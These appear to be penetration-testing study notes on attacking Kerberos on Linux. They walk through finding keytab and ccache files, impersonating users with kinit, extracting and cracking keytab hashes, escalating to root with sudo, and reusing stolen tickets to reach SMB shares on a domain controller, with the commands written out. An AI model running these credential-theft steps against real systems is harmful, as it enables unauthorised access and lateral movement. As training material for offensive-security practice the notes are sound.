### Kerberos on Linux
- Uses same process as Kerberos on Windows
- Store the ticket information depending on the Linux distribution and implementation
	- In most cases, Linux machines store Kerberos tickets as `ccache files` in the `/tmp` directory
		- These `ccache files` are protected by specific read/write permissions
	- By default, the location of the Kerberos ticket is stored in the environment variable `KRB5CCNAME`
- `Keytab`: A file containing pairs of Kerberos principles and encrypted keys (which are derived from the Kerberos password)
	- Can be used to authenticate to various remote systems using Kerberos without entering a password
	- Must be recreated after a password change

### Finding Kerberos tickets in Linux
#### Finding KeyTab files
- When an administrator commonly creates a Kerberos ticket to be used with a script, it sets the extension to `.keytab`
- We use `find` command to find files ending in `.keytab`
- Another way to find `KeyTab` files is in automated scripts configured using a cronjob or any other Linux service

##### Using Find to search for files with keytab in the name
- `find / -name *keytab* -ls 2>/dev/null`

##### Identifying KeyTab files in Cronjobs
- `crontab -i`
- **kinit**: allows interaction with Kerberos, and its function is to request the user's TGT and store this ticket in the cache (ccache file)
- **NOTE**: Linux domain-joined machine needs a ticket. The ticket is represented as a keytab file located by default at `/etc/krb5.keytab` and can only be read by the root user

#### Finding ccache files
- Ccache file holds Kerberos credentials while they remain valid and, generally, while the user's session lasts

##### Reviewing environment variables for ccache files
- `env | grep -i krb5`

##### Searching for ccache files in /tmp
- `ls -la /tmp`

### Abusing KeyTab files
- First thing we can do is impersonate a user using `kinit`
- To use a keytab file, we need to know the user it was created for
- `klist`: A tool which reads information from a **keytab** file

#### Listing KeyTab file information
- `klist -k -t [keytab file]`

#### Impersonating a user with a KeyTab
- `klist`
- `kinit [username]@[domain name] -k -t [keytab file]`
- `klist`

#### Connecting to SMB Share on Impersonated User
- `smbclient //dc01/[username] -k -c ls`

****
### KeyTab Extract
- Secondly, we can extract secrets from a keytab file
- If we want to gain access to the impersonated user's account on the Linux machine, we'll need his password
- We can attempt to crack the account's password by extracting the hashes from the keytab file
- `KeyTabExtract`: A tool to extract valuable information from 502-type `.keytab` files, which may be used to authenticate Linux boxes to Kerberos
	- The script will extract information such as the realm, Service Principle, Encryption Type, and Hashes

#### Extracting KeyTab hashes with KeyTabExtract
- `python3 keytabextract.py [keytab file]`
- And then crack the password using **HashCat**, **John the Ripper**, or with online repositories like `https://crackstation.net/`

#### Log in as the Imporsonated User
- `su - [username]@[domain name]`
- `klist`

### Abusing KeyTab ccache
- Located at `/tmp`, but only the user who created them can read them, so we need root access

#### Privilege Escalation to Root
- `ssh [username]@[domain name]@[target IP] -p 2222`
- `sudo -l`
- `sudo su`
- `whoami`

#### Looking for ccache Files
- `ls -l /tmp`

#### Identifying Group Membership With the id Command
- `id [user name]@[domain name]`

#### Importing the ccache File Into Our Current Session
- `klist`
- `cp [ccache file] .`
- `export KRB5CCNAME=[ccache file]`
- `klist`
- `smbclient //dc01(computer name)/C$ -k -c ls -no-pass`
